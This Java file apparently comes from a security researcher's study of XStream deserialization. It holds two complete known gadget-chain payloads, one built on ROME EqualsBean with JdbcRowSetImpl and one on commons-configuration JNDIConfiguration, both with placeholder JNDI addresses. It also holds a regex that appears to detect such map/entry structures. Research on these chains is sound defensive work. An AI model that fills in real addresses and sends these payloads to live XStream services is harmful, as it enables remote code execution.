package com.threedr3am.bug.feature;

import java.util.regex.Pattern;

/**
 * @author threedr3am
 */
public class XStream {

  static Pattern pattern = Pattern.compile("<map>\\s*?<entry>\\s*?<[\\w$\\.]+?>");

  public static void main(String[] args) {
    printAndMatch(payload);
    printAndMatch(payload2);

    printAndMatch(write(new XStream()));
    printAndMatch(write(new A("threedr3am")));

    //todo XStream使用反射设置field，所以，需要map这些方法触发
    read("<com.threedr3am.bug.feature.A>\n"
        + "  <xx>threedr3am</xx>\n"
        + "  <yy>threedr3am</yy>\n"
        + "</com.threedr3am.bug.feature.A>");
  }

  private static String write(Object o) {
    com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
    return xs.toXML(o);
  }

  private static Object read(String xml) {
    com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
    return xs.fromXML(xml);
  }

  private static void printAndMatch(String xml) {
    System.out.println(xml);
    System.out.println();
    System.out.println(pattern.matcher(xml).find());
    System.out.println("---------------------------------------------------------------");
  }

  private static String payload = "<map>\n"
      + "  <entry>\n"
      + "    <com.rometools.rome.feed.impl.EqualsBean>\n"
      + "      <beanClass>com.rometools.rome.feed.impl.ToStringBean</beanClass>\n"
      + "      <obj class=\"com.rometools.rome.feed.impl.ToStringBean\">\n"
      + "        <beanClass>com.sun.rowset.JdbcRowSetImpl</beanClass>\n"
      + "        <obj class=\"com.sun.rowset.JdbcRowSetImpl\" serialization=\"custom\">\n"
      + "          <javax.sql.rowset.BaseRowSet>\n"
      + "            <default>\n"
      + "              <concurrency>1008</concurrency>\n"
      + "              <escapeProcessing>true</escapeProcessing>\n"
      + "              <fetchDir>1000</fetchDir>\n"
      + "              <fetchSize>0</fetchSize>\n"
      + "              <isolation>2</isolation>\n"
      + "              <maxFieldSize>0</maxFieldSize>\n"
      + "              <maxRows>0</maxRows>\n"
      + "              <queryTimeout>0</queryTimeout>\n"
      + "              <readOnly>true</readOnly>\n"
      + "              <rowSetType>1004</rowSetType>\n"
      + "              <showDeleted>false</showDeleted>\n"
      + "              <dataSource>11111</dataSource>\n"
      + "              <params/>\n"
      + "            </default>\n"
      + "          </javax.sql.rowset.BaseRowSet>\n"
      + "          <com.sun.rowset.JdbcRowSetImpl>\n"
      + "            <default>\n"
      + "              <iMatchColumns>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "                <int>-1</int>\n"
      + "              </iMatchColumns>\n"
      + "              <strMatchColumns>\n"
      + "                <string>foo</string>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "                <null/>\n"
      + "              </strMatchColumns>\n"
      + "            </default>\n"
      + "          </com.sun.rowset.JdbcRowSetImpl>\n"
      + "        </obj>\n"
      + "      </obj>\n"
      + "    </com.rometools.rome.feed.impl.EqualsBean>\n"
      + "    <com.rometools.rome.feed.impl.EqualsBean reference=\"../com.rometools.rome.feed.impl.EqualsBean\"/>\n"
      + "  </entry>\n"
      + "  <entry>\n"
      + "    <com.rometools.rome.feed.impl.EqualsBean reference=\"../../entry/com.rometools.rome.feed.impl.EqualsBean\"/>\n"
      + "    <com.rometools.rome.feed.impl.EqualsBean reference=\"../../entry/com.rometools.rome.feed.impl.EqualsBean\"/>\n"
      + "  </entry>\n"
      + "</map>";

  private static String payload2 = "<map>\n"
      + "  <entry>\n"
      + "    <org.apache.commons.configuration.ConfigurationMap>\n"
      + "      <configuration class=\"org.apache.commons.configuration.JNDIConfiguration\">\n"
      + "        <listeners class=\"empty-list\"/>\n"
      + "        <errorListeners class=\"empty-list\"/>\n"
      + "        <lockDetailEventsCount/>\n"
      + "        <detailEvents>0</detailEvents>\n"
      + "        <listDelimiter>,</listDelimiter>\n"
      + "        <delimiterParsingDisabled>false</delimiterParsingDisabled>\n"
      + "        <throwExceptionOnMissing>false</throwExceptionOnMissing>\n"
      + "        <log class=\"org.apache.commons.logging.impl.NoOpLog\"/>\n"
      + "        <prefix>foo</prefix>\n"
      + "        <context class=\"javax.naming.spi.ContinuationDirContext\">\n"
      + "          <cpe>\n"
      + "            <stackTrace/>\n"
      + "            <suppressedExceptions class=\"java.util.Collections$UnmodifiableRandomAccessList\" resolves-to=\"java.util.Collections$UnmodifiableList\">\n"
      + "              <c class=\"list\"/>\n"
      + "              <list reference=\"../c\"/>\n"
      + "            </suppressedExceptions>\n"
      + "            <resolvedObj class=\"javax.naming.Reference\">\n"
      + "              <className>Foo</className>\n"
      + "              <addrs/>\n"
      + "              <classFactory>22222</classFactory>\n"
      + "              <classFactoryLocation>11111</classFactoryLocation>\n"
      + "            </resolvedObj>\n"
      + "          </cpe>\n"
      + "        </context>\n"
      + "        <clearedProperties/>\n"
      + "      </configuration>\n"
      + "    </org.apache.commons.configuration.ConfigurationMap>\n"
      + "    <org.apache.commons.configuration.ConfigurationMap reference=\"../org.apache.commons.configuration.ConfigurationMap\"/>\n"
      + "  </entry>\n"
      + "  <entry>\n"
      + "    <org.apache.commons.configuration.ConfigurationMap reference=\"../../entry/org.apache.commons.configuration.ConfigurationMap\"/>\n"
      + "    <org.apache.commons.configuration.ConfigurationMap reference=\"../../entry/org.apache.commons.configuration.ConfigurationMap\"/>\n"
      + "  </entry>\n"
      + "</map>";

}

class A {
  private String xx;
  private String yy;

  public A() {
    System.out.println("call A()");
  }

  public A(String xx) {
    System.out.println("call A(String xx)");
    this.xx = xx;
  }

  public String getXx() {
    return xx;
  }

  public void setXx(String xx) {
    System.out.println("call setXx(String xx)");
    this.xx = xx;
  }

  public String getYy() {
    return yy;
  }

  public void setYy(String yy) {
    System.out.println("call setYy(String yy)");
    this.yy = yy;
  }
}
